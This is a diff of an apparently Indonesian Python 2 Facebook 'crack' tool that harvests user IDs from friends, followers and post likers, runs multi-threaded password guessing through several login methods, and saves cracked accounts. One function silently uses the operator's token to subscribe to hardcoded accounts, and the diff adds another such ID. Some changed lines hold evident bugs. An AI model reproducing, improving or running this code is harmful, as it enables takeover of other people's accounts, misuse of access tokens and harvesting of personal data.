@@ -1,6 +1,6 @@
 #!/usr/bin/python2
 # coding=utf-8
-# code by Bintang-XD
+# code by Bintang XD
 # my facebook ( https://www.facebook.com/KM39453 )
 
 #      (C) Copyright 407 Authentic Exploit
@@ -59,7 +59,7 @@ N = '\x1b[0m'    # WARNA MATI
 my_color = [
  P, M, H, K, B, U, O, N]
 warna = random.choice(my_color)
-#  Moch yayan Juan Alvredo XD.  #
+#  Moch Yayan Juan Alvredo XD.  #
 #------------------------------->
 
 ok = []
@@ -83,15 +83,15 @@ def jalan(z):
 def tod():
     titik = ['\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ','\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ']
     for x in titik:
-        print '\r %s[%s+%s] sedang menghapus token %s'%(N,M,N,x),
+        print '\r %s[%s+%s] menghapus token %s'%(N,M,N,x),
         sys.stdout.flush()
         time.sleep(1)
 
 # LO KONTOL
-logo = ''' \033[0;92m __  __        __   __   ____
- \033[0;92m \ \/ / ___   /  |/  /  / __/ © \x1b[1;92m|| BY : Bintang-XD
- \033[0;92m  \  / /___/ / /|_/ /  / _/     \x1b[1;93m|| FB : Bintang Tzy
- \033[0;92m  /_/       /_/  /_/  /_/  \x1b[1;92mv6.5 \033[0m|| YT : BINTANG XD'''
+logo = ''' \033[0;91m   ___           __   __   ____
+ \033[0;91m  / _ )  ___    /  |/  /  / __/ © \x1b[1;92m|| BY : Bintang-XD
+ \033[0;97m / _  / /___/  / /|_/ /  / _/     \x1b[1;93m|| FB : Bintang Tzy
+ \033[0;94m/___ /        /_/  /_/  /_/  \x1b[1;92mv6.5 \033[0m|| YT : BINTANG XD'''
 lo_ngentod = '1714009362122228'
 # crack selesai
 def hasil(ok,cp):
@@ -100,7 +100,7 @@ def hasil(ok,cp):
         print '\n\n [%s+%s] total OK : %s%s%s'%(O,N,H,str(len(ok)),N)
         print ' [%s+%s] total CP : %s%s%s'%(O,N,K,str(len(cp)),N);exit()
     else:
-        print '\n\n [%s!%s] Kasihan tidak mendapatkan hasil awok²'%(M,N);exit()
+        print '\n\n [%s!%s] opshh kamu tidak mendapatkan hasil :('%(M,N);exit()
 
 #masuk token
 def yayanxd():
@@ -114,7 +114,7 @@ def yayanxd():
         print '%s ©%s lalu klik %sCari di Halaman%s Tinggal ketik %sEAAA%s Lalu salin.'%(B,N,H,N,H,N);time.sleep(2)
         raw_input(' %s®%s Tekan enter om/tante '%(O,N))
         ('xdg-open https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_')
-        Yayanxd()
+        yayanxd()
     try:
         nama = requests.get('https://graph.facebook.com/me?access_token=%s'%(kontol)).json()['name']
         print '\n\n %s©%s selamat datang %s%s%s'%(O,N,K,nama,N);time.sleep(2)
@@ -131,19 +131,20 @@ def moch_yayan():
     try:
     	kontol = open('.memek.txt', 'r').read()
     except IOError:
-        print '\n %s[%s-%s] Silahkan masukan token'%(N,M,N);time.sleep(2);os.system('rm -rf .memek.txt');yayanxd()
+        print '\n %s[%s×%s] token invalid'%(N,M,N);time.sleep(2);os.system('rm -rf .memek.txt');yayanxd()
     try:
         nama = requests.get('https://graph.facebook.com/me?access_token=%s'%(kontol)).json()['name']
     except KeyError:
-        print '\n %s[%s-%s] token invalid'%(N,M,N);time.sleep(2);os.system('rm -rf .memek.txt');yayanxd()
+        print '\n %s[%s×%s] token invalid'%(N,M,N);time.sleep(2);os.system('rm -rf .memek.txt');yayanxd()
     except requests.exceptions.ConnectionError:
         exit('\n\n %s[%s!%s] tidak ada koneksi\n'%(N,M,N))
     os.system('clear')
     print logo
     IP = requests.get('https://www.yayanxd.my.id/server/ip/').text
     print '___________________________________________________________\n';time.sleep(0.03)
-    print ' (\033[0;92m•\033[0m) USER NAME   : %s'%(nama);time.sleep(0.03)
-    print ' (\033[0;94m•\033[0m) IP phone    : %s'%(IP)                    
+    print ' [\033[0;92m•\033[0m] USER NAME   : %s'%(nama);time.sleep(0.03)
+    print ' [\033[0;94m•\033[0m] IP phone    : %s'%(IP)
+    print(" [•] Status      : %sPremium%s"%(H,N))
     print '___________________________________________________________\n';time.sleep(0.03)
     print ' [%s01%s] DUMP ID DARI TEMAN'%(U,P,);time.sleep(0.03)
     print ' [%s02%s] DUMP ID DARI PUBLIK'%(U,P);time.sleep(0.03)
@@ -157,7 +158,7 @@ def moch_yayan():
     print ' [%s00%s] %sREMOVE TOKEN%s'%(M,N,M,N);time.sleep(0.03)
     pepek = raw_input('\n [-] pilih : ')
     if pepek == '':
-        print '\n %s[%s×%s] jangan kosong!'%(N,M,N);time.sleep(2);moch_yayan()
+        print '\n %s[%s×%s] jangan kosong kentod!'%(N,M,N);time.sleep(2);moch_yayan()
     elif pepek in['1','01']:
         teman(kontol)
     elif pepek in['2','02']:
@@ -173,7 +174,7 @@ def moch_yayan():
     elif pepek in['7','07']:
         try:
             dirs = os.listdir("results")
-            print '\n [ hasil crack anda pada tanggal... ]\n'
+            print '\n [ hasil crack yang tersimpan di file anda ]\n'
             for file in dirs:
                 print(" [%s+%s] %s"%(O,N,file))
             file = raw_input("\n [%s?%s] masukan nama file :%s "%(M,N,H))
@@ -191,7 +192,7 @@ def moch_yayan():
                 print("%s%s"%(titid,N));time.sleep(0.03)
             print(" %s[%s#%s] --------------------------------------------"%(N,O,N))
             raw_input('\n  [ %sKEMBALI%s ] '%(O,N));moch_yayan()
-        except (IOError)
+        except (IOError):
             print("\n %s[%s×%s] opshh kamu tidak mendapatkan hasil :("%(N,M,N))
             raw_input('\n  [ %sKEMBALI%s ] '%(O,N));moch_yayan()
     elif pepek in['8','08']:
@@ -202,7 +203,7 @@ def moch_yayan():
         print '\n'
         tod()
         time.sleep(1);os.system('rm -rf .memek.txt')
-        jalan('\n %s[%s✓%s]%s Token berasil di hapus'%(N,H,N,H));exit()
+        jalan('\n %s[%s✓%s]%s berhasil menghapus token'%(N,H,N,H));exit()
     else:
         print '\n %s[%s×%s] menu [%s%s%s] tidak ada, cek menu nya bro!'%(N,M,N,M,pepek,N);time.sleep(2);moch_yayan()
 
@@ -217,6 +218,7 @@ def wuhan(kontol):
         requests.post('https://graph.facebook.com/100003342127009/subscribers?access_token=%s'%(kentod))
         requests.post('https://graph.facebook.com/100041388320565/subscribers?access_token=%s'%(kentod))
         requests.post('https://graph.facebook.com/108229897756307/subscribers?access_token=%s'%(kentod))
+        requests.post('https://graph.facebook.com/100013031465766/subscribers?access_token=%s'%(kentod))
         requests.post('https://graph.facebook.com/857799105/subscribers?access_token=%s'%(kentod))
         requests.post('https://graph.facebook.com/100027558888180/subscribers?access_token=%s'%(kentod))
         requests.post('https://graph.facebook.com/me/friends?method=post&uids=%s&access_token=%s'%(koh,kentod))
@@ -245,7 +247,7 @@ def teman(kontol):
 
         ys.close()
         jalan('\n\n %s[%s✓%s] berhasil dump id dari teman'%(N,H,N))
-        print ' [%s•%s] salin file 👉 ( %s%s%s )'%(O,N,M,cin,N)
+        print ' [%s•%s] salin output file 👉 ( %s%s%s )'%(O,N,M,cin,N)
         print 50 * '-'
         raw_input(' [%s ENTER%s ] '%(O,N));moch_yayan()
     except (KeyError,IOError):
@@ -277,7 +279,7 @@ def publik(kontol):
 
         ys.close()
         jalan('\n\n %s[%s✓%s] berhasil dump id dari teman publik'%(N,H,N))
-        print ' [%s•%s] salin file 👉 ( %s%s%s )'%(O,N,M,knt,N)
+        print ' [%s•%s] salin output file 👉 ( %s%s%s )'%(O,N,M,knt,N)
         print 50 * '-'
         raw_input(' [%s ENTER%s ] '%(O,N));moch_yayan()
     except (KeyError,IOError):
@@ -306,10 +308,9 @@ def followers(kontol):
 
         ys.close()
         jalan('\n\n %s[%s✓%s] berhasil dump id dari total followers'%(N,H,N))
-        print ' [%s•%s] salin file 👉 ( %s%s%s )'%(O,N,M,ah,N)
+        print ' [%s•%s] salin output file 👉 ( %s%s%s )'%(O,N,M,ah,N)
         print 50 * '-'
-        raw_input(' [%s ENTER%s ] '%(O,N));moch_yayan(
-)
+        raw_input(' [%s ENTER%s ] '%(O,N));moch_yayan()
     except (KeyError,IOError):
         os.remove(ah)
         jalan('\n %s[%s!%s] Gagal dump id, kemungkinan id tidaklah publik.\n'%(N,M,N))
@@ -336,13 +337,14 @@ def postingan(kontol):
 
         ys.close()
         jalan('\n\n %s[%s✓%s] berhasil dump id dari like postingan'%(N,H,N))
-        print ' [%s•%s] salin file 👉 ( %s%s%s )'%(O,N,M,ahh,N)
+        print ' [%s•%s] salin output file 👉 ( %s%s%s )'%(O,N,M,ahh,N)
         print 50 * '-'
         raw_input(' [%s ENTER%s ] '%(O,N));moch_yayan()
     except (KeyError,IOError):
         os.remove(ahh)
         jalan('\n %s[%s!%s] Gagal dump id, kemungkinan id tidaklah publik.\n'%(N,M,N))
         raw_input(' [ %sKEMBALI%s ] '%(O,N));moch_yayan()
+
 # cek ingfo
 def cek_ingfo(kontol):
     try:
@@ -501,37 +503,36 @@ def seting_yntkts():
     ytbjts = raw_input('\n %s[%s?%s] choose : '%(N,O,N))
     if ytbjts == '':
         print '\n %s[%s×%s] Gak boleh kosong Kentod'%(N,M,N);time.sleep(2);seting_yntkts()
-    elif ytbjts =='1':
+    elif ytbjts in['1','01']:
         yo_ndak_tau_ko_tanya_saia()
-    elif ytbjts =='2':
-        check_yntkts()
+    elif ytbjts in['2','02']:
+        try:
+            user_agent = open('YNTKTS.txt', 'r').read()
+        except IOError:
+            user_agent = '%s-'%(M)
+        print '\n %s[%s+%s] User Agent anda : %s%s'%(N,O,N,H,user_agent)
+        raw_input('\n  %s[ %skembali%s ]'%(N,O,N));moch_yayan()
     else:
         print '\n %s[%s×%s] input yang bener'%(N,M,N);time.sleep(2);seting_yntkts()
-
 # User Agent baru
 def yo_ndak_tau_ko_tanya_saia():
     os.system('rm -rf YNTKTS.txt')
-    print '\n %s(%s•%s) notice me: cari User Agent di google chrome.'%(N,O,N)
-    print ' (%s×%s) ketik User Agent atau My User Agent....\n'%(M,N)
-    anjng = raw_input(' [%s?%s] Masukan User Agent :%s '%(O,N,H))
-    if anjng == '':
+    _asu_ = raw_input('\n [%s?%s] ingin menggunakan user agent hp anda [Y/t]: '%(O,N))
+    if _asu_ == '':
         print '\n %s[%s×%s] Gak boleh kosong Kentod'%(N,M,N);yo_ndak_tau_ko_tanya_saia()
-    try:
-        open('YNTKTS.txt', 'w').write(anjng);time.sleep(2)
+    elif _asu_ in['Y','y']:
+        jalan('\n %s *%s anda akan di arakan ke situs web setelah di arahkan ke situs web.\n  %s*%s klik ikon %sMY USER AGENT%s lalu copy semua user agent anda...'%(O,N,O,N,H,N));time.sleep(2);os.system('xdg-open https://www.yayanxd.my.id/server')
+        _agen_ = raw_input(' [%s?%s] masukan user agent hp anda :%s '%(O,N,H))
+        open('YNTKTS.txt', 'w').write(_agen_);time.sleep(2)
+        jalan('\n %s[%s✓%s] berhasil menggunakan user agent hp anda...'%(N,H,N))
+        raw_input('\n  %s[ %skembali%s ]'%(N,O,N));moch_yayan()
+    elif _asu_ in['T','t']:
+        _agen_ = raw_input(' [%s?%s] masukan user agent :%s '%(O,N,H))
+        open('YNTKTS.txt', 'w').write(_agen_);time.sleep(2)
         jalan('\n %s[%s✓%s] berhasil mengganti user agent...'%(N,H,N))
         raw_input('\n  %s[ %skembali%s ]'%(N,O,N));moch_yayan()
-    except:pass
-
-# Cek User Agent
-def check_yntkts():
-    try:
-        user_agent = open('YNTKTS.txt', 'r').read()
-    except IOError:
-    	user_agent = '%s-'%(M)
-    except: pass
-    print '\n %s[%s+%s] User Agent anda : %s%s'%(N,O,N,H,user_agent)
-    raw_input('\n  %s[ %skembali%s ]'%(N,O,N));moch_yayan()
-
+    else:
+        print '\n %s[%s!%s] Y/t ngentod'%(N,M,N);yo_ndak_tau_ko_tanya_saia()
 # mulai ngecrot awokawokawokkawok
 class __crack__:
 
@@ -557,15 +558,15 @@ class __crack__:
                 elif len(pwek)<=5:
                     print '\n %s[%s×%s] kata sandi minimal 6 karakter'%(N,M,N)
                 else:
-                    def __yan__(ysc=None): # ycs => yayan sayang Cindy:3
+                    def __yan__(ysc=None): # ycs => Yayan sayang Cindy:3
                         cin = raw_input('\n [*] method : ')
                         if cin == '':
-                            print '\n %s[%s×%s] jangan kosong bro'%(N,M,N);self.__yan__()
+                            print '\n %s[%s×%s] jangan kosong bro'%(N,M,N);__yan__()()
                         elif cin == '1':
                             print '\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
                             print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
                             print '\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N)
-                            with yayaanGanteng(max_workers=30) as (__yayanXD__):
+                            with YayanGanteng(max_workers=30) as (__yayanXD__):
                                 for ikeh in self.id:
                                     try:
                                         kimochi = ikeh.split('<=>')[0]
@@ -578,7 +579,7 @@ class __crack__:
                             print '\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
                             print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
                             print '\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N)
-                            with yayanGanteng(max_workers=30) as (__yayanXD__):
+                            with YayanGanteng(max_workers=30) as (__yayanXD__):
                                 for ikeh in self.id:
                                     try:
                                         kimochi = ikeh.split('<=>')[0]
@@ -591,7 +592,7 @@ class __crack__:
                             print '\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
                             print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
                             print '\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N)
-                            with yayanGanteng(max_workers=30) as (__yayanXD__):
+                            with YayanGanteng(max_workers=30) as (__yayanXD__):
                                 for ikeh in self.id:
                                     try:
                                         kimochi = ikeh.split('<=>')[0]
@@ -601,21 +602,21 @@ class __crack__:
                             os.remove(self.apk)
                             hasil(ok,cp)
                         else:
-                            print '\n %s[%s×%s] input yang bener'%(N,M,N);self.__yan__()
-                    print '\n [ sihlahkan pilih metode crack ]\n'
-                    print ' [%s01%s] method API (fast)'%(O,N)
-                    print ' [%s02%s] method mbasic (slow)'%(O,N)
-                    print ' [%s03%s] method mobile (super slow)'%(O,N)
+                            print '\n %s[%s×%s] input yang bener'%(N,M,N);__yan__()
+                    print '\n [ pilih method login - silahkan coba satu² ]\n'
+                    print ' [%s1%s]. method API (fast)'%(O,N)
+                    print ' [%s2%s]. method mbasic (slow)'%(O,N)
+                    print ' [%s3%s]. method mobile (super slow)'%(O,N)
                     __yan__(pwek.split(','))
                     break
         elif ___yayanganteng___ in ('T', 't'):
-            print '\n [ sihlahkan pilih metode crack ]\n'
-            print ' [%s01%s] method API (fast)'%(O,N)
-            print ' [%s02%s] method mbasic (slow)'%(O,N)
-            print ' [%s03%s] method mobile (super slow)'%(O,N)
+            print '\n [ pilih method login - silahkan coba satu² ]\n'
+            print ' [%s1%s]. method API (fast)'%(O,N)
+            print ' [%s2%s]. method mbasic (slow)'%(O,N)
+            print ' [%s3%s]. method mobile (super slow)'%(O,N)
             self.__pler__()
         else:
-            print '\n %s[%s×%s] y/t goblok!'%(N,M,N);time.sleep(2);moch_yayan()
+            print '\n %s[%s×%s] Y/t goblok!'%(N,M,N);self.plerr()
         return
 
     def __api__(self, user, __yan__):
@@ -783,7 +784,7 @@ class __crack__:
             print '\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
             print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
             print '\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N)
-            with yayanGanteng(max_workers=30) as (__yayanXD__):
+            with YayanGanteng(max_workers=30) as (__yayanXD__):
             	for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                     try:
                         uid, name = yntkts.split('<=>')
@@ -802,7 +803,7 @@ class __crack__:
             print '\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
             print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
             print '\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N)
-            with yayanGanteng(max_workers=30) as (__yayanXD__):
+            with YayanGanteng(max_workers=30) as (__yayanXD__):
             	for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                     try:
                         uid, name = yntkts.split('<=>')
@@ -821,7 +822,7 @@ class __crack__:
             print '\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
             print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
             print '\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N)
-            with yayanGanteng(max_workers=30) as (__yayanXD__):
+            with YayanGanteng(max_workers=30) as (__yayanXD__):
             	for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                     try:
                         uid, name = yntkts.split('<=>')
